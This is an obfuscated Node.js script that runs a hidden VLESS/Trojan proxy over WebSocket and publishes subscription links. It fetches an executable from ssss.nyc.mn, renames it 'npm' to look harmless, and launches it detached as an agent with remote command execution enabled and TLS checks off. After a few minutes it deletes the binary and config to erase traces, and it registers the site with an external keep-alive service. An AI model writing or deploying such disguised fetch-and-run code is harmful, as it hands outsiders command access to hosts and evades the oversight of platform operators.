const _0x996e65=_0x2db9;(function(_0x144d3f,_0x4c90d1){const _0x570570=_0x2db9,_0x1e9350=_0x144d3f();while(!![]){try{const _0x479a56=parseInt(_0x570570(0xa7))/0x1*(-parseInt(_0x570570(0xd4))/0x2)+parseInt(_0x570570(0x8f))/0x3*(parseInt(_0x570570(0xbe))/0x4)+parseInt(_0x570570(0xa6))/0x5+-parseInt(_0x570570(0x70))/0x6*(-parseInt(_0x570570(0xd0))/0x7)+-parseInt(_0x570570(0xaf))/0x8*(parseInt(_0x570570(0xdc))/0x9)+-parseInt(_0x570570(0x7e))/0xa*(parseInt(_0x570570(0x86))/0xb)+parseInt(_0x570570(0x9e))/0xc;if(_0x479a56===_0x4c90d1)break;else _0x1e9350['push'](_0x1e9350['shift']());}catch(_0x8c1d1e){_0x1e9350['push'](_0x1e9350['shift']());}}}(_0x129a,0x7ac62));const os=require('os'),http=require(_0x996e65(0x72)),fs=require('fs'),axios=require(_0x996e65(0xa4)),net=require(_0x996e65(0xc1)),path=require(_0x996e65(0x82)),crypto=require(_0x996e65(0xb2)),{Buffer}=require(_0x996e65(0xd8)),{exec,execSync}=require(_0x996e65(0xb5)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x996e65(0x8a)]||_0x996e65(0xcc),NEZHA_SERVER=process[_0x996e65(0xda)][_0x996e65(0x6d)]||'',NEZHA_PORT=process[_0x996e65(0xda)][_0x996e65(0xbc)]||'',NEZHA_KEY=process['env'][_0x996e65(0xd1)]||'',DOMAIN=process[_0x996e65(0xda)]['DOMAIN']||_0x996e65(0x89),AUTO_ACCESS=process['env'][_0x996e65(0x81)]||!![],WSPATH=process[_0x996e65(0xda)][_0x996e65(0x78)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x996e65(0xda)]['SUB_PATH']||'sub',NAME=process[_0x996e65(0xda)][_0x996e65(0x71)]||'',PORT=process[_0x996e65(0xda)]['PORT']||0x1eb4;function _0x129a(){const _0x2fbe99=['connect','length','utf8','error:\x20','13136556LQsBsY','true','vless://','arm64','application/dns-json','message','axios','Not\x20Found\x0a','2033400UHedeo','2xFsHYT','npm','log','map','every','listen','then','close','8tMVocr','decode','get','crypto','aarch64','application/json','child_process','https://amd64.ssss.nyc.mn/agent','false','once','https://dns.google/resolve?name=','pipe','sha224','NEZHA_PORT','write','3787844RsWdNU','&type=A','Server','net','error','chmod\x20+x\x20npm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','test','npm\x20is\x20running','--tls','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','catch','country_code','5eaabea4-f6d4-91fd-b8f0-17e004c89c60','type','reduce','\x20-p\x20','1743qETUAL','NEZHA_KEY','isp','url','848278VZxrnr','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','trim','npm\x20running\x20error:','buffer','Failed\x20to\x20resolve\x20','env','utf-8','5771718hXVoWw','https://arm64.ssss.nyc.mn/agent','find','Server\x20is\x20running\x20on\x20port\x20','client_secret:\x20','slice','toString','readUInt8',':443?security=tls&sni=','443','setsid\x20nohup\x20./npm\x20-s\x20','Hello\x20world!','8443','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','concat','digest','https://oooo.serv00.net/add-url','config.yaml','index.html','connection','pop','replace','post','Answer','NEZHA_SERVER','2083','unlink','12102UqsaGa','NAME','http','readUInt16BE','includes','8.8.4.4','2087','createWriteStream','WSPATH','2096','https://api.ip.sb/geoip','text/plain','base64','arch','50soxYaF','end','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','AUTO_ACCESS','path','\x20with\x20all\x20DNS\x20servers','update','trojan://','2107875dpmjpx','Automatic\x20Access\x20Task\x20added\x20successfully','readFile','1234.abc.com','UUID','createServer','data','join','substr','3kPnSKz',':443?encryption=none&security=tls&sni=','arm','1.1.1.1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2053','from','writeHead','text/html','&fp=chrome&type=ws&host=','&path=%2F'];_0x129a=function(){return _0x2fbe99;};return _0x129a();}let ISP='';const GetISP=async()=>{const _0xc7a2af=_0x996e65;try{const _0x8626b0=await axios[_0xc7a2af(0xb1)](_0xc7a2af(0x7a)),_0x57988e=_0x8626b0[_0xc7a2af(0x8c)];ISP=(_0x57988e[_0xc7a2af(0xcb)]+'-'+_0x57988e[_0xc7a2af(0xd2)])['replace'](/ /g,'_');}catch(_0x4dd704){ISP='Unknown';}};GetISP();const httpServer=http[_0x996e65(0x8b)]((_0x1e7073,_0x2afa8d)=>{const _0x179da0=_0x996e65;if(_0x1e7073[_0x179da0(0xd3)]==='/'){const _0x4cd886=path[_0x179da0(0x8d)](__dirname,_0x179da0(0x67));fs[_0x179da0(0x88)](_0x4cd886,_0x179da0(0x9c),(_0x5487cc,_0x3c2ba3)=>{const _0xd5d1ef=_0x179da0;if(_0x5487cc){_0x2afa8d[_0xd5d1ef(0x96)](0xc8,{'Content-Type':_0xd5d1ef(0x97)}),_0x2afa8d['end'](_0xd5d1ef(0xe7));return;}_0x2afa8d[_0xd5d1ef(0x96)](0xc8,{'Content-Type':'text/html'}),_0x2afa8d[_0xd5d1ef(0x7f)](_0x3c2ba3);});return;}else{if(_0x1e7073['url']==='/'+SUB_PATH){const _0x475dd5=NAME?NAME+'-'+ISP:ISP,_0x2c7897=_0x179da0(0xa0)+UUID+'@'+DOMAIN+_0x179da0(0x90)+DOMAIN+_0x179da0(0x98)+DOMAIN+_0x179da0(0x99)+WSPATH+'#'+_0x475dd5,_0xb7bf9a=_0x179da0(0x85)+UUID+'@'+DOMAIN+_0x179da0(0xe4)+DOMAIN+_0x179da0(0x98)+DOMAIN+_0x179da0(0x99)+WSPATH+'#'+_0x475dd5,_0x5c7694=_0x2c7897+'\x0a'+_0xb7bf9a,_0x189271=Buffer[_0x179da0(0x95)](_0x5c7694)[_0x179da0(0xe2)](_0x179da0(0x7c));_0x2afa8d['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x2afa8d[_0x179da0(0x7f)](_0x189271+'\x0a');}else _0x2afa8d[_0x179da0(0x96)](0x194,{'Content-Type':_0x179da0(0x7b)}),_0x2afa8d[_0x179da0(0x7f)](_0x179da0(0xa5));}}),wss=new WebSocket[(_0x996e65(0xc0))]({'server':httpServer}),uuid=UUID[_0x996e65(0x6a)](/-/g,''),DNS_SERVERS=[_0x996e65(0x75),_0x996e65(0x92)];function resolveHost(_0x45b2ba){return new Promise((_0x4caad3,_0x178f3e)=>{const _0x54d95b=_0x2db9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x54d95b(0xc5)](_0x45b2ba)){_0x4caad3(_0x45b2ba);return;}let _0x36b544=0x0;function _0x449690(){const _0x43aeb0=_0x54d95b;if(_0x36b544>=DNS_SERVERS[_0x43aeb0(0x9b)]){_0x178f3e(new Error(_0x43aeb0(0xd9)+_0x45b2ba+_0x43aeb0(0x83)));return;}const _0x321b14=DNS_SERVERS[_0x36b544];_0x36b544++;const _0x2ed08e=_0x43aeb0(0xb9)+encodeURIComponent(_0x45b2ba)+_0x43aeb0(0xbf);axios[_0x43aeb0(0xb1)](_0x2ed08e,{'timeout':0x1388,'headers':{'Accept':_0x43aeb0(0xa2)}})['then'](_0x12f94d=>{const _0x3bf05=_0x43aeb0,_0x21611d=_0x12f94d[_0x3bf05(0x8c)];if(_0x21611d['Status']===0x0&&_0x21611d['Answer']&&_0x21611d[_0x3bf05(0x6c)][_0x3bf05(0x9b)]>0x0){const _0x473c79=_0x21611d['Answer'][_0x3bf05(0xde)](_0x28b1af=>_0x28b1af[_0x3bf05(0xcd)]===0x1);if(_0x473c79){_0x4caad3(_0x473c79[_0x3bf05(0x8c)]);return;}}_0x449690();})[_0x43aeb0(0xca)](_0x2dd185=>{_0x449690();});}_0x449690();});}function handleVlessConnection(_0x85c193,_0x215a14){const _0xcc01d8=_0x996e65,[_0x463d88]=_0x215a14,_0x3209da=_0x215a14[_0xcc01d8(0xe1)](0x1,0x11);if(!_0x3209da[_0xcc01d8(0xab)]((_0x21016f,_0x4d6271)=>_0x21016f==parseInt(uuid[_0xcc01d8(0x8e)](_0x4d6271*0x2,0x2),0x10)))return![];let _0x3797f7=_0x215a14[_0xcc01d8(0xe1)](0x11,0x12)[_0xcc01d8(0xe3)]()+0x13;const _0x21cc38=_0x215a14[_0xcc01d8(0xe1)](_0x3797f7,_0x3797f7+=0x2)[_0xcc01d8(0x73)](0x0),_0xebcb7b=_0x215a14[_0xcc01d8(0xe1)](_0x3797f7,_0x3797f7+=0x1)[_0xcc01d8(0xe3)](),_0x1f949a=_0xebcb7b==0x1?_0x215a14[_0xcc01d8(0xe1)](_0x3797f7,_0x3797f7+=0x4)[_0xcc01d8(0x8d)]('.'):_0xebcb7b==0x2?new TextDecoder()[_0xcc01d8(0xb0)](_0x215a14[_0xcc01d8(0xe1)](_0x3797f7+0x1,_0x3797f7+=0x1+_0x215a14[_0xcc01d8(0xe1)](_0x3797f7,_0x3797f7+0x1)[_0xcc01d8(0xe3)]())):_0xebcb7b==0x3?_0x215a14[_0xcc01d8(0xe1)](_0x3797f7,_0x3797f7+=0x10)['reduce']((_0x28a165,_0x3ede68,_0x568673,_0x12bdd3)=>_0x568673%0x2?_0x28a165[_0xcc01d8(0xea)](_0x12bdd3[_0xcc01d8(0xe1)](_0x568673-0x1,_0x568673+0x1)):_0x28a165,[])[_0xcc01d8(0xaa)](_0x5e0ff2=>_0x5e0ff2[_0xcc01d8(0x73)](0x0)[_0xcc01d8(0xe2)](0x10))[_0xcc01d8(0x8d)](':'):'';_0x85c193['send'](new Uint8Array([_0x463d88,0x0]));const _0x370777=createWebSocketStream(_0x85c193);return resolveHost(_0x1f949a)['then'](_0x56d3bf=>{const _0x3a2330=_0xcc01d8;net[_0x3a2330(0x9a)]({'host':_0x56d3bf,'port':_0x21cc38},function(){const _0x1eceea=_0x3a2330;this[_0x1eceea(0xbd)](_0x215a14[_0x1eceea(0xe1)](_0x3797f7)),_0x370777['on']('error',()=>{})[_0x1eceea(0xba)](this)['on'](_0x1eceea(0xc2),()=>{})[_0x1eceea(0xba)](_0x370777);})['on'](_0x3a2330(0xc2),()=>{});})[_0xcc01d8(0xca)](_0x522d26=>{const _0x4a58ed=_0xcc01d8;net[_0x4a58ed(0x9a)]({'host':_0x1f949a,'port':_0x21cc38},function(){const _0x4f4884=_0x4a58ed;this[_0x4f4884(0xbd)](_0x215a14['slice'](_0x3797f7)),_0x370777['on']('error',()=>{})[_0x4f4884(0xba)](this)['on'](_0x4f4884(0xc2),()=>{})[_0x4f4884(0xba)](_0x370777);})['on'](_0x4a58ed(0xc2),()=>{});}),!![];}function handleTrojanConnection(_0x2cad2b,_0x2b04fa){const _0x3bc854=_0x996e65;try{if(_0x2b04fa[_0x3bc854(0x9b)]<0x3a)return![];const _0x41465a=_0x2b04fa['slice'](0x0,0x38)[_0x3bc854(0xe2)](),_0x59695f=[UUID];let _0x25b581=null;for(const _0x14dfcb of _0x59695f){const _0x406152=crypto['createHash'](_0x3bc854(0xbb))[_0x3bc854(0x84)](_0x14dfcb)[_0x3bc854(0xeb)]('hex');if(_0x406152===_0x41465a){_0x25b581=_0x14dfcb;break;}}if(!_0x25b581)return![];let _0x30367b=0x38;_0x2b04fa[_0x30367b]===0xd&&_0x2b04fa[_0x30367b+0x1]===0xa&&(_0x30367b+=0x2);const _0x48d6c8=_0x2b04fa[_0x30367b];if(_0x48d6c8!==0x1)return![];_0x30367b+=0x1;const _0x306a78=_0x2b04fa[_0x30367b];_0x30367b+=0x1;let _0x4672dd,_0x3bebc3;if(_0x306a78===0x1)_0x4672dd=_0x2b04fa[_0x3bc854(0xe1)](_0x30367b,_0x30367b+0x4)['join']('.'),_0x30367b+=0x4;else{if(_0x306a78===0x3){const _0x20f062=_0x2b04fa[_0x30367b];_0x30367b+=0x1,_0x4672dd=_0x2b04fa[_0x3bc854(0xe1)](_0x30367b,_0x30367b+_0x20f062)[_0x3bc854(0xe2)](),_0x30367b+=_0x20f062;}else{if(_0x306a78===0x4)_0x4672dd=_0x2b04fa[_0x3bc854(0xe1)](_0x30367b,_0x30367b+0x10)[_0x3bc854(0xce)]((_0x14119c,_0x289813,_0x1263ca,_0x3e8fc1)=>_0x1263ca%0x2?_0x14119c[_0x3bc854(0xea)](_0x3e8fc1[_0x3bc854(0xe1)](_0x1263ca-0x1,_0x1263ca+0x1)):_0x14119c,[])['map'](_0x46ecdc=>_0x46ecdc['readUInt16BE'](0x0)[_0x3bc854(0xe2)](0x10))['join'](':'),_0x30367b+=0x10;else return![];}}_0x3bebc3=_0x2b04fa['readUInt16BE'](_0x30367b),_0x30367b+=0x2;_0x30367b<_0x2b04fa[_0x3bc854(0x9b)]&&_0x2b04fa[_0x30367b]===0xd&&_0x2b04fa[_0x30367b+0x1]===0xa&&(_0x30367b+=0x2);const _0x18ca81=createWebSocketStream(_0x2cad2b);return resolveHost(_0x4672dd)[_0x3bc854(0xad)](_0x4c3f4e=>{const _0x42044b=_0x3bc854;net[_0x42044b(0x9a)]({'host':_0x4c3f4e,'port':_0x3bebc3},function(){const _0x5557bc=_0x42044b;_0x30367b<_0x2b04fa[_0x5557bc(0x9b)]&&this[_0x5557bc(0xbd)](_0x2b04fa['slice'](_0x30367b)),_0x18ca81['on'](_0x5557bc(0xc2),()=>{})[_0x5557bc(0xba)](this)['on']('error',()=>{})[_0x5557bc(0xba)](_0x18ca81);})['on'](_0x42044b(0xc2),()=>{});})['catch'](_0x4bf167=>{net['connect']({'host':_0x4672dd,'port':_0x3bebc3},function(){const _0xd3ff45=_0x2db9;_0x30367b<_0x2b04fa[_0xd3ff45(0x9b)]&&this[_0xd3ff45(0xbd)](_0x2b04fa[_0xd3ff45(0xe1)](_0x30367b)),_0x18ca81['on'](_0xd3ff45(0xc2),()=>{})[_0xd3ff45(0xba)](this)['on']('error',()=>{})[_0xd3ff45(0xba)](_0x18ca81);})['on']('error',()=>{});}),!![];}catch(_0x32d1e2){return![];}}function _0x2db9(_0x3c0be9,_0x57b879){_0x3c0be9=_0x3c0be9-0x67;const _0x129acd=_0x129a();let _0x2db985=_0x129acd[_0x3c0be9];return _0x2db985;}wss['on'](_0x996e65(0x68),(_0x32f3cf,_0x12348d)=>{const _0x40afef=_0x996e65,_0x1327ed=_0x12348d['url']||'';_0x32f3cf[_0x40afef(0xb8)](_0x40afef(0xa3),_0x36dcf4=>{const _0x29c552=_0x40afef;if(_0x36dcf4['length']>0x11&&_0x36dcf4[0x0]===0x0){const _0xa7cf3b=_0x36dcf4[_0x29c552(0xe1)](0x1,0x11),_0x230c72=_0xa7cf3b[_0x29c552(0xab)]((_0x22ba55,_0x1a43b8)=>_0x22ba55==parseInt(uuid[_0x29c552(0x8e)](_0x1a43b8*0x2,0x2),0x10));if(_0x230c72){!handleVlessConnection(_0x32f3cf,_0x36dcf4)&&_0x32f3cf[_0x29c552(0xae)]();return;}}!handleTrojanConnection(_0x32f3cf,_0x36dcf4)&&_0x32f3cf[_0x29c552(0xae)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x56cc27=_0x996e65,_0x3287cd=os[_0x56cc27(0x7d)]();return _0x3287cd===_0x56cc27(0x91)||_0x3287cd===_0x56cc27(0xa1)||_0x3287cd===_0x56cc27(0xb3)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x56cc27(0xdd):!NEZHA_PORT?_0x56cc27(0xc9):_0x56cc27(0xb6);},downloadFile=async()=>{const _0x58ab1f=_0x996e65;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x35da28=getDownloadUrl(),_0x141491=await axios({'method':_0x58ab1f(0xb1),'url':_0x35da28,'responseType':'stream'}),_0x253d01=fs[_0x58ab1f(0x77)](_0x58ab1f(0xa8));return _0x141491[_0x58ab1f(0x8c)][_0x58ab1f(0xba)](_0x253d01),new Promise((_0x3bce54,_0x3d4e24)=>{const _0x5c6a9f=_0x58ab1f;_0x253d01['on']('finish',()=>{const _0x8ab73b=_0x2db9;console[_0x8ab73b(0xa9)]('npm\x20download\x20successfully'),exec(_0x8ab73b(0xc3),_0x47f6ee=>{if(_0x47f6ee)_0x3d4e24(_0x47f6ee);_0x3bce54();});}),_0x253d01['on'](_0x5c6a9f(0xc2),_0x3d4e24);});}catch(_0x2490e2){throw _0x2490e2;}},runnz=async()=>{const _0x2c2256=_0x996e65;try{const _0x17dccc=execSync(_0x2c2256(0x80),{'encoding':_0x2c2256(0xdb)});if(_0x17dccc[_0x2c2256(0xd6)]()!==''){console[_0x2c2256(0xa9)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x4ca390){}await downloadFile();let _0x2b0c3a='',_0x5b8a55=[_0x2c2256(0xe5),_0x2c2256(0xe8),_0x2c2256(0x79),_0x2c2256(0x76),_0x2c2256(0x6e),_0x2c2256(0x94)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x13c0d1=_0x5b8a55[_0x2c2256(0x74)](NEZHA_PORT)?_0x2c2256(0xc7):'';_0x2b0c3a=_0x2c2256(0xe6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c2256(0xcf)+NEZHA_KEY+'\x20'+_0x13c0d1+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4b35f9=NEZHA_SERVER[_0x2c2256(0x74)](':')?NEZHA_SERVER['split'](':')[_0x2c2256(0x69)]():'',_0x4a01ad=_0x5b8a55[_0x2c2256(0x74)](_0x4b35f9)?_0x2c2256(0x9f):_0x2c2256(0xb7),_0x157d59=_0x2c2256(0xe0)+NEZHA_KEY+_0x2c2256(0xc4)+NEZHA_SERVER+_0x2c2256(0xd5)+_0x4a01ad+_0x2c2256(0x93)+UUID;fs['writeFileSync'](_0x2c2256(0xed),_0x157d59);}_0x2b0c3a=_0x2c2256(0xc8);}else{console[_0x2c2256(0xa9)](_0x2c2256(0xe9));return;}}try{exec(_0x2b0c3a,{'shell':'/bin/bash'},_0x28e8cb=>{const _0x52ba9c=_0x2c2256;if(_0x28e8cb)console[_0x52ba9c(0xc2)](_0x52ba9c(0xd7),_0x28e8cb);else console[_0x52ba9c(0xa9)](_0x52ba9c(0xc6));});}catch(_0x494e74){console['error'](_0x2c2256(0x9d)+_0x494e74);}};async function addAccessTask(){const _0xc9961c=_0x996e65;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3d8780='https://'+DOMAIN;try{const _0x526b03=await axios[_0xc9961c(0x6b)](_0xc9961c(0xec),{'url':_0x3d8780},{'headers':{'Content-Type':_0xc9961c(0xb4)}});console[_0xc9961c(0xa9)](_0xc9961c(0x87));}catch(_0x20f117){}}const delFiles=()=>{const _0x1619b2=_0x996e65;fs[_0x1619b2(0x6f)](_0x1619b2(0xa8),()=>{}),fs['unlink'](_0x1619b2(0xed),()=>{});};httpServer[_0x996e65(0xac)](PORT,()=>{const _0x2b4c11=_0x996e65;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2b4c11(0xa9)](_0x2b4c11(0xdf)+PORT);});
